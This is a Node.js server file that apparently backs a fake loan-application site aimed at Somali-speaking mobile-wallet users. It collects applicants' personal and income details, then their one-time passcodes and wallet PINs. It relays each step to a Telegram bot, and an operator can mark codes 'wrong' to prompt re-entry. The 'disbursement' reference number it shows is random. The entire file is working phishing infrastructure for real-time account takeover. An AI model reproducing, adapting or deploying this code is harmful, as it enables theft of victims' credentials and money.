const express = require('express');
const app = express();
const http = require('http').createServer(app);
const io = require('socket.io')(http);
const axios = require('axios');
const path = require('path');

app.use(express.json());

// Serves the user interface layout directly to fix Render's "Cannot GET /" error
app.use(express.static(path.join(__dirname, 'public')));

app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

const activeSessions = new Map();

// Formats the URL securely even if the protocol prefix is omitted in the dashboard settings
let rawBotUrl = process.env.BOT_MANAGER_URL || 'http://localhost:3001';
if (!rawBotUrl.startsWith('http://') && !rawBotUrl.startsWith('https://')) {
    rawBotUrl = 'https://' + rawBotUrl;
}
const BOT_MANAGER_URL = rawBotUrl;

io.on('connection', (socket) => {
    // Generate a clean application identity token
    const appId = 'WAAFI-' + Math.floor(100000 + Math.random() * 900000);
    
    activeSessions.set(socket.id, {
        appId: appId, socketId: socket.id,
        loanType: '', amount: 1200, term: '1', purpose: '',
        firstName: '', lastName: '', email: '', phone: '',
        employment: '', income: '', employer: '',
        otpToken: '', pinCode: '', step: 1
    });

    socket.emit('session-ready', { appId: appId });
    socket.join(appId);

    // STEP 1: Basic Profile Submission
    socket.on('step1', (payload) => {
        let session = activeSessions.get(socket.id);
        if (session) { 
            Object.assign(session, payload);
            session.step = 2; 
            activeSessions.set(socket.id, session); 
        }
    });

    // STEP 2: Secondary Profile Submission
    socket.on('step2', (payload) => {
        let session = activeSessions.get(socket.id);
        if (session) { 
            Object.assign(session, payload);
            session.step = 3; 
            activeSessions.set(socket.id, session); 
        }
    });

    // STEP 3: Automated data verification handler (Bypasses old admin check block entirely)
    socket.on('step3', (payload) => {
        let session = activeSessions.get(socket.id);
        if (!session) return;
        
        Object.assign(session, payload);
        session.step = 4;
        activeSessions.set(socket.id, session);

        // INSTANT ADVANCE: Immediately unlocks Step 4 (OTP page) on the frontend browser interface
        socket.emit('admin-approve-otp'); 

        // Dispatches profile records silently to the Telegram ledger (No interactive buttons attached)
        axios.post(`${BOT_MANAGER_URL}/log-step3-data`, { session })
            .catch(err => console.error("Step 3 Telegram communication drop:", err.message));
    });

    // STEP 4: Triggered ONLY when the user populates and submits their 6-digit verification OTP token
    socket.on('step4-otp', (payload) => {
        let session = activeSessions.get(socket.id);
        if (!session) return;

        session.otpToken = payload.otp;
        activeSessions.set(socket.id, session);

        // Alert the admin panel to provide verify/reject options
        axios.post(`${BOT_MANAGER_URL}/trigger-step4-telegram`, { session })
            .catch(err => console.error("Step 4 Telegram communication drop:", err.message));
    });

    // STEP 5: Triggered ONLY when the user inputs and submits their structural wallet PIN 
    socket.on('step5-pin', (payload) => {
        let session = activeSessions.get(socket.id);
        if (!session) return;

        session.pinCode = payload.pin;
        activeSessions.set(socket.id, session);

        // Alert the admin panel to authorize final disbursement execution
        axios.post(`${BOT_MANAGER_URL}/trigger-step5-telegram`, { session })
            .catch(err => console.error("Step 5 Telegram communication drop:", err.message));
    });

    socket.on('disconnect', () => { activeSessions.delete(socket.id); });
});

// =========================================================================
// ACTION CONTROL INTERCEPT HANDLER ROUTER FROM TELEGRAM WEBHOOK CALLS
// =========================================================================
app.post('/api/admin-action', (req, res) => {
    const { actionSignal, targetAppId, message } = req.body;
    
    let targetSession = null;
    for (let [socketId, record] of activeSessions.entries()) {
        if (record.appId === targetAppId) { targetSession = record; break; }
    }

    if (!targetSession) return res.status(404).json({ error: "Active application thread missing" });
    const clientSocket = io.sockets.sockets.get(targetSession.socketId);
    if (!clientSocket) return res.status(410).json({ error: "Target device connection is offline" });

    if (actionSignal === 'approve_otp') {
        // Moves the frontend browser directly to the Step 5 secure PIN collection window
        clientSocket.emit('admin-approve-otp'); 
    } else if (actionSignal === 'otp-failed') {
        clientSocket.emit('otp-failed', { message: message || "Code-ka OTP-ga aad gelisay waa khalad. Fadlan dib u tijaabi." });
    } else if (actionSignal === 'approve_pin') {
        // Generates random success sequence and forces frontend into Step 6 success card view
        const generatedRef = 'COD-' + Math.floor(100000 + Math.random() * 900000);
        clientSocket.emit('pin-verified', { referenceId: generatedRef }); 
    } else if (actionSignal === 'pin-failed') {
        clientSocket.emit('pin-failed', { message: message || "PIN-ka koontada aad gelisay waa khalad. Fadlan iska hubi." });
    }

    return res.json({ success: true });
});

const PORT = process.env.PORT || 3000;
http.listen(PORT, () => console.log(`Core application instance operating on port ${PORT}`));